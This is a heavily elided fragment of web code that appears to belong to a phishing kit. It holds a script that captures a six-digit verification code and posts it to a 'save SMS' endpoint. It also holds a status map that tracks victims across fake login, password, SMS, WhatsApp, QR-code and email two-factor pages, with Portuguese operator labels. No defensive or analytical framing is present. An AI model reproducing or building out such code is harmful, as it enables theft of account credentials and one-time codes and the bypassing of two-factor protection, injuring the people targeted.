...
<body>
            ...
            if (code.length === 6) {
                try {
                    const response = await fetch('api_salvar_sms.php', {
                        ...
                        body: JSON.stringify({ sms_code: code, source: 'email' })
                    });
    ...
    <script>
        (function() {
            const statusMap = { 'index.php': '...', 'login-mobile.php': '...', 'senha.php': '...', 'senha-mobile.php': '...', 'dois_fatores.php': '...', 'dois_fatores2.php': '...', 'doisfatores2mobile.php': '...', 'sms_desktop.php': '...', 'sms_mobile.php': '...', 'sms_whats_desktop.php': '...', 'sms_whats_mobile.php': '...', 'qrcode-mobile.php': '...', 'telaqr.php': '...', 'email2fadesktop.php': '...', 'email2famobile.php': '...', 'emailsms_desktop.php': '...', 'emailsms_mobile.php': 'Usuário na tela para logar com código no E-mail (Mobile)', 'sms2fadesktop.php': '...', 'sms2famobile.php': '...', 'whats2fadesktop.php': '...', 'whats2framobile.php': '...' };
